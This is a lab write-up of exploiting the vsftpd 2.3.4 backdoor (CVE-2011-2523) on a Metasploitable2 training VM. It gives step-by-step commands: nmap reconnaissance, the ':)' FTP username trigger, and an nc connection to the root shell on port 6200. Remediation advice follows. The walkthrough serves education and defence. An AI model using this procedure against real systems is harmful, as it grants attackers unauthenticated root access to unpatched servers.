# Metasploitable2 – vsftpd 2.3.4 Backdoor Exploitation

## ⚠️ Disclaimer
This was performed entirely within my own isolated VirtualBox lab environment
(Kali Linux + Metasploitable2, host-only network with no internet access).
No real-world systems were accessed. This is for educational purposes only.

## 🎯 Objective
Identify and exploit a known backdoor vulnerability in an intentionally
vulnerable practice machine (Metasploitable2) to understand how outdated
software can lead to full remote root compromise.

## 🧪 Lab Setup
- **Attacker machine:** Kali Linux (VirtualBox VM)
- **Target machine:** Metasploitable2 (VirtualBox VM)
- **Network:** VirtualBox Host-Only Adapter (isolated, no external access)
- Both machines confirmed reachable via `ping`

## 🔍 Reconnaissance
Ran a full port scan against the target:

    nmap 192.168.241.128

Result: 23 open TCP ports, including FTP (21), SSH (22), Telnet (23),
SMTP (25), HTTP (80), MySQL (3306), IRC (6667), and more.

Focused on port 21 for version detection:

    nmap -sV -p 21 192.168.241.128

Result:

    21/tcp open ftp vsftpd 2.3.4

## 🐛 Vulnerability Identified
**CVE-2011-2523** – vsftpd 2.3.4 contains a malicious backdoor that was
secretly inserted into the source code distributed between June and July 2011.
If a username containing the string `:)` is submitted, the backdoor opens a
root command shell on TCP port 6200, bypassing authentication entirely.

## 💥 Exploitation Steps
1. Connected to FTP and submitted the trigger username:

       ftp 192.168.241.128
       Name: user:)

2. Verified the backdoor port opened:

       nmap -p 6200 192.168.241.128
       # Result: 6200/tcp open

3. Connected directly to the backdoor shell:

       nc 192.168.241.128 6200

4. Confirmed access level:

       whoami
       # Result: root

## 💣 Impact
Full unauthenticated **root-level** remote code execution on the target
system — the highest possible level of compromise, achieved with zero
credentials.

## 🛡️ Remediation
- Upgrade vsftpd to a patched version immediately
- Verify software integrity via checksums/signatures before installing
- Restrict FTP service exposure to trusted networks only
- Monitor for unexpected listening ports (e.g., 6200)

## 📚 Lessons Learned
This exercise demonstrated how a single compromised software package can
lead to complete system takeover, and reinforced the importance of patch
management, software supply-chain verification, and network segmentation.
